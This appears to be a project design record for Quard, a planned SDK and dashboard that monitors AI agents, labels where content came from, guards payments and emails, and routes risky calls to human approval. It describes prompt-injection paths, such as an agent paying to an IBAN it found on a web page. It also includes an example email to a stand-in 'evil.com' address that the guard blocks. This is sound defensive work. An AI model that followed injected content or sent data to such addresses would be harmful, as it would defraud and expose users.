# Quard

Quard watches AI agents while they work. It records every model call, stops dangerous actions before they run, and shows which step and which agent caused a failure.

Every piece of content gets a label that says where it came from. Guards use the labels live. The dashboard uses them afterwards. Quard works for one agent and for agents that delegate to, message and share memory with each other.

**About this file**

- Product spec: [Agent monitor, SDK and guards](https://claude.ai/artifact/GA9gWjEHoHnuzDGVdLBx43). It has three tabs: the spec, "Guards in depth" and "Open questions".
- Q1 to Q27 are the questions in the spec's "Open questions" tab. The [Decision record](#decision-record) lists each answer and who decided it.
- This file records the decisions made on 2026-10-03. Where it disagrees with the spec, this file wins. Past changes to the spec are listed in [Changes to the spec](#changes-to-the-spec).
- Decisions marked **Claude's pick** were chosen by Claude after the owner said "go with your own picks". Review those first.
- Build order: [ROADMAP.md](ROADMAP.md).
- Coding rules: [AGENTS.md](AGENTS.md). Dashboard look and feel: [web/DESIGN.md](web/DESIGN.md).

## Contents

1. [What v1 includes](#what-v1-includes)
2. [Repo layout](#repo-layout)
3. [Tech stack](#tech-stack)
4. [SDK](#sdk)
5. [Guards](#guards)
6. [Approvals](#approvals)
7. [Multi-agent](#multi-agent)
8. [Root-cause finder](#root-cause-finder)
9. [AI inside Quard](#ai-inside-quard)
10. [Data, storage and hosting](#data-storage-and-hosting)
11. [Services](#services)
12. [Dashboard](#dashboard)
13. [Decision record](#decision-record)
14. [Changes to the spec](#changes-to-the-spec)
15. [Open items](#open-items)

## What v1 includes

In v1:

- A TypeScript SDK for the OpenAI Responses API.
- `monitor`, which wraps the OpenAI client, and `guard()`, which wraps tools, with all five guard types.
- Labels, value matching, run limits and the fleet check.
- Approvals on a dashboard page.
- The root-cause finder, with replay and an AI-written explanation.
- Multi-agent runs: run context, labeled messages across processes and a generic shared-memory wrapper.
- An integration for the OpenAI Agents SDK (JS).
- The Jev detector, in observe mode: it saves scores but never changes a decision.
- A self-hosted install with Docker and Postgres.

Later:

- Anthropic Messages, Chat Completions and a Python SDK.
- Approvals in Slack, email or the app's own UI.
- Rules edited in a file or in the dashboard.
- Near-match and paraphrase matching.
- Integrations for the Vercel AI SDK, Mastra, LangGraph and others.
- Native adapters for pgvector, Pinecone, Chroma and other stores.
- Jev acting on its scores, and other detectors.
- A hosted service, single sign-on and OpenTelemetry export.

## Repo layout

```text
.
├── db/
│   └── migrations/   # Postgres schema changes, plain SQL, run in order
├── packages/
│   ├── shared/       # code the SDK and the services must share
│   └── sdk/          # the Quard SDK, published as "quard"
│       └── guards/   # one folder per guard type
├── services/
│   ├── webhook/      # receives SDK events; public, agent keys only
│   ├── control/      # SDK connect, rules, counters, approvals, revocation; public, agent keys only
│   └── worker/       # background jobs from the queue; no endpoint
├── web/              # dashboard (Next.js)
├── AGENTS.md
└── PROJECT.md
```

Only `web/` exists today. The rest is the plan.

How the parts talk:

```text
Your app + Quard SDK
    ├── events, in batches ───────────► services/webhook ──┐
    └── connect, counters, approvals ─► services/control ──┤
                                                            ▼
web (dashboard) ◄────────────────────────────────────► Postgres ◄──► services/worker
people sign in and approve here                     data + job queue
```

### packages/shared

Code that must behave the same in the SDK and on the server:

- event and API schemas (Zod)
- label types: origin, trust, sensitivity
- value normalizers: IBAN, email, URL, domain, file path
- the keyed hash for sensitive values
- refusal text templates

The SDK bundles this package, so it must not hold database or server code.

### packages/sdk

What teams install. Suggested folders inside it (**Claude's pick**):

```text
packages/sdk/
├── monitor/        # wrapped client, request and response checks
├── context/        # run context: run, agent, parent step
├── labels/         # label engine, content index, value matching
├── pipeline/       # the nine-step guard pipeline
├── guards/         # source, action, approval, egress, limit
├── detectors/      # detector interface, jev/
├── memory/         # shared-memory wrapper
├── integrations/   # openai-agents/
└── transport/      # link to control, uploads to webhook
```

## Tech stack

All **Claude's pick**, except the parts already set up in `web/`.

- TypeScript everywhere, in one pnpm workspace at the repo root. When the workspace is created, move the settings in `web/pnpm-workspace.yaml` and `web/.prettierrc` up to the root.
- Prettier with 4 spaces and a print width of 120, as `web/.prettierrc` already sets.
- Node 24 LTS for the services. The SDK supports Node 22.12 and later and ships as ESM.
- TypeScript 5.9 or 6.x, pinned in each package.json, because npm's `latest` tag is now 7.0. Not 7.0 yet: it has no programmatic API, and typescript-eslint needs one.
- Hono for `webhook` and `control`.
- Postgres 18 as the only database. Plain SQL migrations in `db/migrations`. Kysely for typed queries.
- pg-boss for the job queue, on the same Postgres.
- Zod for schemas, shared through `packages/shared`.
- Vitest for tests. Coverage must be 100% for lines, branches, functions and statements in every package, every service and `web/`. CI fails below that.
- tsdown to build the SDK.
- The dashboard already uses Next.js 16.3.8, React 19.2.8, Tailwind CSS 4 and shadcn.
- IDs use the W3C trace format: a 32-hex run id and a 16-hex step id. This keeps OpenTelemetry export open for later.

## SDK

### Setup

```ts
import OpenAI from "openai";
import { quard, guard } from "quard";

quard.configure({
    key: process.env.QUARD_AGENT_KEY,
    webhookUrl: process.env.QUARD_WEBHOOK_URL,
    controlUrl: process.env.QUARD_CONTROL_URL,
});

const client = quard.wrap(new OpenAI());

const fetchPage = guard(rawFetchPage, { type: "source", origin: "web", name: "fetchPage" });
const sendEmail = guard(rawSendEmail, [{ type: "egress", name: "sendEmail" }, { type: "limit" }]);
const payInvoice = guard(rawPayInvoice, { type: "approval", name: "payInvoice" });

await quard.run({ agent: "billing" }, async () => {
    const res = await client.responses.create({ model, input, tools });
    // run the model's tool calls through the guarded functions
});
```

Developers use two names: the `quard` object and `guard()`. Inside Quard, the part that watches model calls is called the monitor.

### How monitor sees model calls

Decided by Q1, Q2 and Q3.

- `quard.wrap(client)` installs the monitor as the client's `fetch`. Every request, stream and endpoint passes through the monitor before the app sees the result.
- v1 supports the OpenAI Responses API in TypeScript. Keep the internal event format provider-neutral, so Anthropic and Python become adapters, not rewrites.
- A Responses result does not include its input, so monitor reads the request itself. This also works with `store: false` and zero data retention.
- Input items get labels by matching their content against labeled content the run already holds, not by their role. A brief from another agent that arrives as a "user" message keeps its web label.
- A request chained to an earlier response, through `previous_response_id` or `conversation`, joins that run and reuses its labels. The SDK takes them from its own in-process copy, or else asks `control`. History Quard never saw counts as untrusted.
- In a stream, monitor passes events through as they arrive. Only the event that completes a tool call is held until that call passes its checks.

**Hosted web search** (Q3)

- Allowed. monitor adds `"web_search_call.action.sources"` to the request's `include` list and keeps any values already there. This only adds the source list to the response.
- monitor records the queries and source URLs, checks the consulted domains against the block and allow lists, and marks the response web-influenced.
- The page text never reaches Quard, so the scan is recorded as `unscanned`, not `pass`.
- Values copied from those pages are found nowhere in the run, so they count as model-generated.
- Teams that need page scanning and exact value tracing run search as their own tool, wrapped with a `source` guard.

**Hosted MCP**

- The Responses API can ask for approval before a hosted MCP tool runs. monitor answers these requests with `action` and `approval` rules.
- This only works while approval stays on for that tool. If `require_approval` is `"never"`, or a filter skips the tool, Quard can only record the call.

### Run context

Decided by the spec (Guards in depth, step 1).

- `guard()` and `monitor` read the run, agent and parent step from the current run context. In Node this is AsyncLocalStorage.
- `quard.run()` starts a run. `quard.agent()` starts a child agent inside it. Everything inside inherits the tags, even across `await`.
- The OpenAI Agents SDK integration takes the current agent from the framework. Handoffs and agents-as-tools switch agents inside one `run()` call, so app code can't set it.
- A call outside any scope joins the run of the response it chains to. Otherwise it starts a new run under the agent `"default"`, which holds every guarded tool. So single-agent apps need no scopes. (**Claude's pick**)

```ts
await quard.run({ agent: "orchestrator" }, async () => {
    const plan = await client.responses.create({ model, input });

    await quard.agent("researcher", async () => {
        await client.responses.create({ model, input: plan.output_text });
        // tagged: same run, agent "researcher", parent step
        await fetchPage(url);
    });
});
```

## Guards

### The pipeline

Every guarded call runs the same nine steps, from Guards in depth:

1. **Context.** Read the run, agent and parent step from the run context.
2. **Permission.** Check that this agent may use this tool in this run. A delegated agent only holds what its parent granted.
3. **Labels.** Label the call and each argument.
4. **Checks.** Run the guards that act before the call: `limit`, `action`, `egress` and `approval`.
5. **Decision.** The strictest result wins: block, then ask, then allow. A blocked call never reaches the tool.
6. **Approval.** On ask, a human sees the arguments, their origins and the path that led there, and approves those exact arguments.
7. **Run.** The tool runs with exactly the checked arguments. Its start, end, result or error are recorded.
8. **Output.** For `source` tools, the output is labeled, scanned and added to the run's content index before the agent sees it.
9. **Record.** Every decision, with its rule and reason, goes to the backend, allows included.

Block checks run again right after an approval. So an approval never overrides a block that came up while waiting, such as a daily cap. (**Claude's pick**)

### Labels

Decided by the spec, Q5 and Q22.

A label has three parts:

- **origin**: which tool, domain, sender, server or agent let the content in
- **trust**: trusted or untrusted
- **sensitivity**: internal or public

Origin comes from the wrapper that let the content in. It never comes from the content itself or from an AI. Trust and sensitivity follow from origin through a mapping.

**Default mapping** (Q5)

| Origin | Trust | Sensitivity |
| --- | --- | --- |
| The user | trusted | internal |
| Your own tools, wrapped with `guard()` but not as `source` | trusted | internal |
| Web pages, hosted web search | untrusted | public |
| Outside email (inbox tools) | untrusted | public |
| MCP servers | untrusted | public |
| Files from `source` tools | untrusted | internal |
| Another agent | the labels of its content | the labels of its content |
| Unknown: unwrapped tools, unlabeled memory, unmonitored channels | untrusted | internal |

The rows for email, files and unknown content are **Claude's pick**.

Teams change one origin at a time, in code. Every override is recorded in the run. Apps open to the public can mark the user as untrusted.

```ts
quard.configure({
    origins: {
        // our own MCP server holds CRM data
        "mcp:crm.acme.internal": { trust: "trusted", sensitivity: "internal" },
    },
});
```

**Context label.** Each call gets the least trusted and most sensitive label among everything the model read before it asked for the call. If that label is untrusted, the call is marked **influenced**. An agent that browses is almost always influenced, so rules for sensitive actions should use value labels.

**Value labels** (Q22). For each argument, Quard lists every place the value appeared earlier in the run.

- Values are compared after normalizing case, spaces and URL form.
- The search covers the whole run's content index, across all agents.
- It also finds a known value inside a longer argument, like a URL or an IBAN inside an email body.
- Typed values always count: IBAN, email, URL or domain, and file path.
- URLs and emails also match by host and by main domain, such as `acme.co.uk` for `mail.acme.co.uk`. The Public Suffix List decides the main domain.
- Other values count only when they look like IDs: 8 or more characters, no spaces, at least one digit, matched on word boundaries.
- Words, phrases, dates and amounts are not traced on their own. The call is still marked influenced.
- A value found nowhere is **model-generated**. Rules can treat it as untrusted for sensitive fields like an IBAN.
- No near-match or paraphrase matching in v1. The root-cause finder can add them later, offline.

### Guard types

From the spec:

| Type | Wrap it around | What it checks | Outcome |
| --- | --- | --- | --- |
| `source` | Tools that bring outside content in: web fetch, search, inbox, files, MCP | Labels the output with its origin; scans for bad domains, hidden instructions and invisible text | Pass, strip, flag or block |
| `action` | Tools that change something: payments, emails, deletes, deploys | Rules on arguments and their labels, such as an IBAN only from supplier records | Allow, block or ask a human |
| `approval` | High-stakes tools | Always asks a human before running | Run or block |
| `egress` | Tools that send data out: email, HTTP posts, uploads | Internal data headed to a destination outside an allowlist or found in untrusted content | Allow, block or ask a human |
| `limit` | Any tool | Calls and amounts per run, agent or day, and a new value suddenly used by many agents | Allow or block |

- **source** runs after the tool returns. It records the exact origin: URL, sender, server or file. It checks the domain against block and allow lists. It scans for instructions aimed at an AI, text shaped like a tool call, and invisible text. Then it passes the content, strips suspect parts, flags it so later actions face stricter rules, or blocks it. Jev scores are recorded here too.
- **action** runs before the call. Typical rules: a value must come from a named origin, like an IBAN from supplier records. Amounts are capped. Never-seen recipients go to a human.
- **approval** always asks first. See [Approvals](#approvals).
- **egress** finds the destination (recipients, host or upload target) and the payload's sensitivity from its value labels and context label. Internal data may only go to allowlisted destinations. It never goes to a destination that first appeared in untrusted content.
- **limit** keeps counters per tool, keyed by run, agent, day and value. It caps calls, amounts and cost, catches delegation loops and fan-out, and runs the fleet check.

**Fleet check** (Q9)

- The check watches recipients, IBANs and domains first seen in the fleet less than 7 days ago. Once a 5th separate run uses one within 24 hours, it is blocked everywhere.
- Teams name the fields to watch, such as `iban`. Blocked attempts count too.
- A blocked value goes on the quarantine list. It stays there until someone marks it known in the dashboard.
- For its first 7 days, the check runs in observe mode, because it has no history yet.

### Guards inside monitor

monitor applies the same checks to what never passes through `guard()`, from Guards in depth:

- Requested tool calls are checked against the agent's permissions and labels before the app receives them.
- A requested tool call that fails this check stays in the response, marked blocked. When the app runs it through its guarded function, the guard returns the refusal at once and the tool never runs. A tool that isn't wrapped with `guard()` can only be recorded, so Quard warns about it.
- In a stream, the event that completes a tool call is held until that check passes.
- Hosted MCP approval requests are answered by `action` and `approval` rules.
- Hosted web search marks the response web-influenced and checks the consulted domains.

### Rules and rollout

Decided by Q6 and Q7.

- Rules live only in code, in `guard()` options. They change through pull requests and roll back with a redeploy.
- Each guard needs `name`: the tool name the model sees. `guard()` throws without it, because a function's own name can differ (`rawFetchPage`) or be lost to minifiers. The dashboard uses it to keep a rule's history across deploys and to link the model's tool call to the matching guarded call.
- On connect, the SDK sends its active rules, as names and a hash, to `control`. Every decision records that hash. The dashboard shows which rules ran but does not edit them.
- Rules a team writes **block by default**. `mode: "observe"` records "would block" or "would ask" and lets the call run. Observe rules never change the final decision.
- Approval guards have no mode. They always ask.
- Defaults the product sets start in observe mode: the run limits and the fleet check's first 7 days. Jev stays in observe mode for all of v1.
- Switching a rule's mode is a code change and a redeploy.

```ts
// Enforces at once (default mode: "block")
const sendEmail = guard(rawSendEmail, { type: "egress", name: "sendEmail", allow: ["*.acme.com"] });

// Try a new rule on live traffic first
const payInvoice = guard(rawPayInvoice, {
    type: "limit",
    name: "payInvoice",
    maxAmountPerDay: 50000,
    mode: "observe",
});
```

### When a guard blocks

Decided by Q20.

- A blocked or denied call returns a **refusal** that the model reads as the tool result. It says what was stopped, why, and not to retry.
- Refusal text comes from fixed templates. It never quotes untrusted content.
- `isGuardRefusal(result)` lets code check for one.
- `onBlock: "throw"` makes a guard throw `GuardBlockedError { guard, reason, refusal }` instead.
- A refusal has `toString()` and `toJSON()`, so it works in a plain Responses loop and in frameworks.
- `guard()` turns only its own decisions into refusals. Errors thrown by the tool are recorded and re-thrown unchanged. Errors that a framework throws on purpose, for example to pause a run, pass through unchanged.

```ts
const out = await sendEmail({ to: "x@evil.com", subject, body });
// rawSendEmail did not run. The model reads:
// "Blocked by egress guard: x@evil.com first appeared
//  in web content. The email was NOT sent. Do not retry."
if (isGuardRefusal(out)) console.warn(out.guard, out.reason);
```

### When the backend is down

Decided by Q23.

| Part | While the backend is unreachable |
| --- | --- |
| Rules, value labels, per-run limits, scans | Run as usual, in-process |
| Approvals and any "ask" | Block after retrying for up to 30 s, reason `backend_unavailable` |
| Per-day limits | Count locally and block once the local count reaches the cap |
| Fleet check and quarantine lists | Use the last synced copy, up to 24 h old |
| Label lookups | A label that can't be looked up counts as untrusted |
| Jev detector | Skipped and noted; detectors only tighten |
| Decision records | Buffered, up to 10,000, and retried every 1 s to 60 s |

If the buffer fills, the oldest allow records are dropped first, and the number lost is recorded. Records sent late carry `degraded: true`.

## Approvals

Decided by Q8, Q21 and Q24.

- **Where.** On a dashboard page in v1. The approver signs in and sees the arguments, each value's origin and the influence path.
- **Waiting.** `guard()` pauses the call until someone answers. Then it runs the tool with exactly the approved arguments, or returns a refusal. This works in any agent loop.
- **No time limit.** A request waits until someone answers, and an approval never expires. It is void if any argument changes.
- **Three answers:**
    - **Approve once.** Runs this call, with these exact arguments, one time.
    - **Always approve.** Later calls pass without asking if they come from the same agent and use the same tool with exactly the same arguments. This holds in any run until someone revokes it in the dashboard. Any changed argument asks again.
    - **Deny.** The call returns a refusal.
- An approval is stored with a hash of the normalized arguments. "Approve once" is bound to the run, agent, step and tool. "Always approve" is bound to the agent, tool and argument hash.
- While a request is open, a new identical call (same agent, tool and arguments) waits on the same request instead of opening another. (**Claude's pick**)
- A waiting process can stop, for example after a crash or a host time limit. Its heartbeats then stop, and the dashboard shows the request as "no longer waiting". The request stays open. An "approve once" given then is used by the next identical call. (**Claude's pick**)
- Some hosts stop a waiting call. Vercel Functions and Cloud Run stop after 5 minutes by default. Vercel allows up to 800 seconds on Pro and Enterprise and 5 minutes on Hobby; Cloud Run allows up to 60 minutes. Teams there should raise the limit where they can, or set the optional `timeout` on a guard. There is no timeout by default. (**Claude's pick**)
- The approver must see real values, so an open request keeps the full arguments. After the decision only the hash is kept. See [Redaction](#redaction).

```ts
const payInvoice = guard(rawPayInvoice, { type: "approval", name: "payInvoice" });

// waits here until someone answers
const out = await payInvoice({ iban, amount: 4950 });
// approve once or always: rawPayInvoice runs with these args
// deny: out is a refusal the model reads
```

## Multi-agent

Decided by the spec and Q11 to Q15.

- **One run.** Every agent's calls land in one run. They form a run graph: the orchestrator at the root, delegated agents as children, and messages and handoffs as edges in time order.
- **Agent versions.** Each agent's model, instructions and tools are recorded once per version, so an incident ties to the version that caused it.
- **Permissions.** An agent holds its own tools, narrowed by what its parent delegated. Delegation can only narrow.
- **Sending** (Q12). Wrap each send or delegate function with `guard()`, like any tool. It checks permissions and the limits on depth, loops and fan-out. Then it writes the run id, the parent step id and a label reference into the message.
- **Receiving** (spec). A receive function wrapped with a `source` guard labels incoming messages with the sender and the labels the sender attached.
- **Across processes** (Q11). Only three things travel: the run id, the parent step id and a label reference.
    - They ride in the slot each channel already has: W3C baggage on HTTP, `_meta` on MCP, `metadata` on A2A, attributes on queue messages.
    - The sender stores the label record, with a hash of the content, before the message leaves.
    - The receiver looks the labels up through `control`.
    - `quard.inject({ content })` returns the three items for the channel's slot. On the receiving side, `quard.resume(carrier, fn)` runs `fn` inside that run.
    - A missing, unreadable or mismatched reference counts as untrusted. Value tracing reconnects the pieces later.
- **Across agents.** Value labels search the whole run's content index, so an IBAN from one agent's web page is caught in another agent's payment.
- **Shared memory** (Q14). A generic wrapper goes around the app's memory read and write functions, or around any store with get, put and search.
    - Labels live in the backend, keyed by a hash of the content. They come back on read, even in a later run.
    - Content changed outside the wrapper fails the hash check and reads back as untrusted.
    - Memory labels are not deleted with runs.
- **Frameworks** (Q13). The OpenAI Agents SDK (JS) comes first. Its integration uses the wrapped OpenAI client, takes the current agent from the framework, and tags handoffs and agents-as-tools. Where it must stop something, it uses the SDK's tool guardrails and approval flow.

```ts
// Sending: a guarded tool like any other
const delegate = guard(rawDelegate, { type: "limit", name: "delegate" });
await delegate({ to: "billing", brief });

// Receiving
const receive = guard(rawReceive, { type: "source", origin: "agent", name: "receive" });
```

**Run limits** (Q15, **Claude's pick**: Balanced)

| Limit | Default per run |
| --- | --- |
| Delegation depth | 3 levels |
| Fan-out | 10 helpers per agent |
| Loops | 5 handoffs back and forth between the same two agents |
| Steps | 200 model calls across all agents |
| Cost | $5 |

- These are product defaults, so they start in observe mode. They record "would block" until a team switches them on.
- Cost is estimated from token usage and a price table. When a price is unknown, the step limit still caps the run.
- When a run spans processes, its counters live in `control`. (**Claude's pick**)

## Root-cause finder

Decided by the spec, Q16 and Q17.

- Labels show at once whether untrusted content shaped a harmful action. Value tracing finds where each value in that action first appeared.
- The **verdict** names the entry point, the turning point, the damage and the missing guard. It is filed as bad input, bad reasoning, bad handoff, broken tool or missing guard.
- Across agents, the verdict names more. It names the entry agent and the handoff that carried the untrusted content. It also names the turning-point agent and the agent that did the damage.
- Bad handoffs are split into three kinds: wrong information sent, a constraint dropped in the message, or a correct message misread.
- The finder runs in `services/worker`.

### Replay

Q16, **Claude's pick**. Replay tests the suspect content by rerunning the turning-point model call, with the earlier steps fixed.

- It runs in rounds of 5 with the suspect content and 5 without, up to 20 each.
- It stops as soon as the result is clear:
    - **confirmed**: after any round, harm is clearly more common with the content than without (one-sided Fisher test, p < 0.0182)
    - **not confirmed**: even if every remaining rerun went the right way, the test could not pass by 20 each
    - **could not reproduce**: 0 harmful runs in the first 10 with the content
- A rerun counts as harmful when the model asks for the same damaging tool call: same tool, same key value after normalizing.
- The cap is $5 per incident. It covers every model call the finder makes, replay and AI reviewer included. When the cap is hit, the finder reports the counts so far and offers to continue with a higher cap.

Replay rules:

- Use the exact recorded model and settings.
- Never run real tools. When the model repeats a recorded tool call, reuse the recorded result.
- Resend the full recorded input with `store: false`. Never use `previous_response_id`, which would bring the suspect content back.
- Hosted MCP tools get `require_approval: "always"` and are never approved. The approval request counts as the model's action.
- Hosted web search is left out. Content that only came from a hosted search can't be rebuilt, so the verdict says "replay limited: URL-only evidence".
- Hashed values are replaced with stand-ins in a valid format, built from the hash. An IBAN gets a valid checksum, and an email keeps its domain.
- Warm the prompt cache with one call per side, then send the rest in parallel. Skip batch APIs in v1.

What replay can't show:

- causes that trigger the harm rarely: at 1 run in 5, they are confirmed only about 20% of the time
- that the removed content was the only cause
- how a different model version would behave

### AI reviewer

Q17, **Claude's pick**. After an incident, an AI writes a short plain-words explanation of the verdict.

- It uses the team's own provider key, the one their agents already use.
- The default model is `gpt-6.1-sol`, at about $0.10 to $0.20 per explanation.
- It only explains. The verdict comes from labels, value tracing and replay.

## AI inside Quard

Decided by the spec, Q25, Q26 and Q27.

- **AI never assigns labels.** Content judged by a model can argue its way to trusted, so origin stays a recorded fact.
- **Detectors only tighten.** A high-risk answer can flag, ask or block. It can never allow what a rule blocked, or raise trust.

### Detector

Q25, **Claude's pick**.

- Jev from TypeSafe, pinned to `jev-1.13.0`, behind a small detector interface. Other detectors can be swapped in later.
- It runs in observe mode in v1: scores are saved but don't change decisions. In this mode the SDK does not wait for Jev, so it adds no delay.
- The questions it answers:
    1. Does this fetched text contain instructions aimed at an AI agent?
    2. Does this user message contain pasted outside content, such as a forwarded email?
    3. Does this tool call match the user's original task?
- Jev is a hosted API only. The content and the longest question must fit in 32,000 tokens together, so long pages are cleaned and split first.
- TypeSafe quotes 70 to 500 ms per call ([InfoQ](https://www.infoq.com/news/2026/10/typesafe-ai-jev-released/)). Its own docs say most calls take about 100 ms. See [TypeSafe's models page](https://docs.typesafe.ai/models).
- It can return a wrong but valid answer, and its docs warn that injected text can move its answer. Test it on the team's own injection examples.
- Jev can't write text, so the AI reviewer uses a different model.

### What AI models may see

Q26, **Claude's pick**.

- Internal run data goes only to the provider the agents already use, which also runs the AI reviewer. Secrets are removed, and emails and IBANs become placeholders.
- Jev is run by another company. By default it gets only content labeled public, such as web pages, outside email and MCP results. Content from an origin marked internal is never sent to it.
- The pasted-content and task-match questions need internal data: the user's message, the task and the tool's arguments. They stay off until a team turns them on and adds the detector to its `egress` allowlist.
- A short description of the app, written by the team, may be sent as context. It holds no user data.

### Thresholds

Q27, **Claude's pick**.

| Question | Flag | Ask | Block or strip |
| --- | --- | --- | --- |
| Instructions aimed at an AI | 0.50 | — | strip the chunk at 0.90 |
| Pasted outside content | 0.50 | — | — |
| Tool call doesn't match the task | 0.50 | 0.80 | never |

All three run in observe mode in v1. Before they ever act, tune them again on at least 200 of the team's own labeled examples per question, and keep the model version pinned.

## Data, storage and hosting

Decided by Q18 and Q19, all **Claude's pick**.

### Hosting

- Self-hosted first. Teams run `web`, `webhook`, `control`, `worker` and Postgres as Docker containers from one compose file, in their own cloud. Traces stay in their network, except the model calls listed in [What AI models may see](#what-ai-models-may-see).
- A hosted service comes later from the same code. Every stored row carries a project id, so that is not a rewrite.

### Storage

- Postgres 18 is the only database. It holds runs, steps, messages, labels, guard decisions, approvals, memory labels, the value index for search and the job queue.
- ClickHouse can come later if volume demands it.

### Retention

- Runs are deleted after 30 days. Each project can change this.
- Runs tied to an incident are kept for 1 year, so verdicts and replay keep working.
- Memory labels are not deleted with runs.
- The hashed first-seen index for the fleet check is kept for 1 year, so old values don't look new again.

### Redaction

- The SDK removes secrets, such as API keys and tokens, before anything leaves the process.
- IBANs, card numbers and emails become keyed hashes plus a mask, such as `DE89…3000`. The email domain stays visible.
- The same normalized value always gives the same hash, so search and value tracing still match.
- Guards see real values in memory. The dashboard shows masks. Replay uses stand-ins. The AI reviewer sees placeholders.
- The one exception is an open approval request: the approver sees the full values. After the decision only the hash is kept.
- The hash is HMAC-SHA-256 with one random 32-byte key per install. The key is set in every agent process and on the server, which needs it to hash search input. It is never sent to us.
- To rotate the key, add a new one and keep the old one for search until old runs expire.
- Names and street addresses stay in clear in v1, because finding them needs a model.
- v1 finds IBANs (pattern and mod-97 check), card numbers (pattern and Luhn check), emails and secrets (gitleaks-style patterns).

## Services

- **Auth.** The SDK talks to `webhook` and `control` with agent keys only. Keys are created and revoked in the dashboard.
- **webhook** receives SDK events: model calls, tool calls, guard decisions, labels and messages.
    - It checks them against the shared schemas, writes them to Postgres and queues follow-up jobs.
    - The format is our own JSON API, not OpenTelemetry. (**Claude's pick**)
    - Most events arrive in batches. Label records that another process may read right away, such as messages to other agents and memory writes, are sent at once. They are acknowledged only after they are stored. (**Claude's pick**)
- **control** is the SDK's live link to the backend. The SDK keeps one long-lived connection to it and reconnects if it drops.
    - **Connect:** the SDK registers its agents, their versions and its active rules.
    - **Counters:** per-day counters, fleet counters, per-run counters for runs that span processes, and quarantine lists.
    - **Approvals:** it creates requests, tracks heartbeats from waiting calls, and returns the decision to the waiting call.
    - **Revocation:** revoked agent keys and revoked "always approve" decisions.
    - **Label lookups:** the labels behind a reference in a message, a memory item or a chained response. (**Claude's pick**)
- **worker** runs jobs from the queue: the root-cause finder, replay, the AI reviewer and retention cleanup. It has no endpoint.
- **web** is the dashboard. It reads and writes Postgres through its own server code and does not call `control`. When an approver decides, `web` writes the decision to Postgres, and `control` hears about it through Postgres `LISTEN/NOTIFY`. (**Claude's pick**)
- **Dashboard sign-in.** Email and password accounts in Postgres, with admin and approver roles. Every approval records who decided. Single sign-on comes later. (**Claude's pick**)

## Dashboard

From the spec, plus the approval decisions.

- **Run view:** one run as a timeline colored by labels.
- **Incident view:** the path from entry point to damage, the verdict and a replay button.
- **Fleet view:**
    - which sources and tools cause the most incidents
    - what guards block
    - which agents are most often entry or turning points
    - which agent-to-agent links carry the most untrusted content
- **Agent graph:** agents as nodes and messages as edges colored by labels, with a click-through to each agent's timeline.
- **Search** across all runs: for example every run that touched a domain or used a given IBAN. Sensitive values are searched by their keyed hash.
- **Approvals:** open requests with their arguments, origins and influence path, answered with approve once, always approve or deny. Also a list of "always" approvals that can be revoked.
- **Settings:** agent keys, accounts and roles, and retention. Origin overrides and rules are shown read-only, because they live in code.

Follow [web/DESIGN.md](web/DESIGN.md) for the look. Read Next's bundled docs before writing code there, as [web/AGENTS.md](web/AGENTS.md) says.

## Decision record

"By" says who decided: the owner, the spec's Guards in depth tab, or Claude after "go with your own picks".

| # | Question | Decision | By |
| --- | --- | --- | --- |
| Q1 | How monitor gets the input side | Wrap the client once, as its `fetch` | Owner |
| Q2 | First providers and languages | OpenAI Responses API, TypeScript | Owner |
| Q3 | Hosted web search | Allowed at URL level and recorded as `unscanned`; teams' own guarded search tool for page text | Owner |
| Q4 | Name | Quard. `quard` was free on npm and PyPI on 2026-10-03 | Owner |
| Q5 | Who sets trust | Built-in defaults, per-origin overrides in code | Owner |
| Q6 | Where rules live | Code only; the dashboard shows them | Owner |
| Q7 | Rollout mode | Block by default, observe per rule; product defaults start in observe | Owner |
| Q8 | Where approvals happen | A dashboard page | Owner |
| Q9 | Fleet check trigger | New within 7 days; a 5th separate run within 24 h | Owner |
| Q10 | Run and agent tags | Scoped run context | Spec |
| Q11 | Tags and labels across processes | Ids and a label reference, on every channel | Owner |
| Q12 | Agent-to-agent messages | Guarded send function; receive wrapped with a `source` guard | Owner, spec |
| Q13 | First framework | OpenAI Agents SDK (JS) | Owner |
| Q14 | Shared memory | Generic store wrapper | Owner |
| Q15 | Run limits | Balanced: depth 3, fan-out 10, 5 handoffs back and forth, 200 steps, $5 | Claude's pick |
| Q16 | Replay | Up to 20 with and 20 without, rounds of 5, early stop, $5 cap | Claude's pick |
| Q17 | AI reviewer model | The team's own provider key; `gpt-6.1-sol` | Claude's pick |
| Q18 | Hosting | Self-hosted first, hosted later | Claude's pick |
| Q19 | Retention and redaction | 30 days, incidents 1 year; remove secrets, hash IBANs, cards and emails | Claude's pick |
| Q20 | When a guard blocks | A refusal the model reads; throwing is opt-in | Owner |
| Q21 | Waiting for approval | Pause and wait | Owner |
| Q22 | Value matching | Exact after normalizing, also inside longer text | Owner |
| Q23 | Backend down | Split by guard type | Owner |
| Q24 | Approval time limits | No time limit; approve once or always approve (same agent, tool and arguments, until revoked) | Owner |
| Q25 | AI detector | Jev, in observe mode in v1, swappable | Claude's pick |
| Q26 | Data for AI models | Internal data only to the team's own provider, masked; Jev gets public content only | Claude's pick |
| Q27 | Detector thresholds | Per question, observe mode in v1 | Claude's pick |
| — | Repo layout | The owner's tree; TypeScript in one pnpm workspace | Owner, Claude's pick |
| — | Where guards run | In-process; the backend for shared state | Spec |
| — | Database and queue | Postgres only, with pg-boss | Claude's pick |
| — | SDK event format | Our own JSON API to `webhook`; W3C ids | Claude's pick |
| — | Auth | Agent keys for the SDK; email and password accounts for the dashboard | Owner, Claude's pick |
| — | SDK names | The `quard` object (`wrap`, `run`, `agent`, `configure`, `inject`, `resume`), `guard()`, `isGuardRefusal`, `GuardBlockedError` | Owner |
| — | Blocked tool calls inside monitor | The call stays in the response, marked blocked; the guarded tool refuses it | Owner |

## Changes to the spec

These points changed the spec. The spec doc was updated to match them on 2026-10-03.

1. **The client is wrapped once.** The spec shows `monitor(await client.responses.create(...))`. Now `quard.wrap(client)` wraps the client once (Q1).
2. **Approvals don't expire.** The spec says an approval is void "if any argument changes or it expires". Now it is void only if an argument changes (Q24).
3. **Labels travel as a reference.** The spec says run tags and labels ride in message metadata. Now only ids and a label reference travel, and labels are looked up through `control` (Q11).
4. **Replay compares both sides.** The spec says replay reruns without the suspect content about twenty times. Now it reruns with and without, up to 20 each, and stops early (Q16).
5. **Hosted tools can't be stopped mid-call.** The spec says guards run before anything executes. Hosted tools run inside the model call, so monitor can only shape the request, like keeping MCP approval on, and check the results afterwards.
6. **Per-run counters for runs that span processes** live in `control`, not only in-process (**Claude's pick**).

## Open items

Not decided yet:

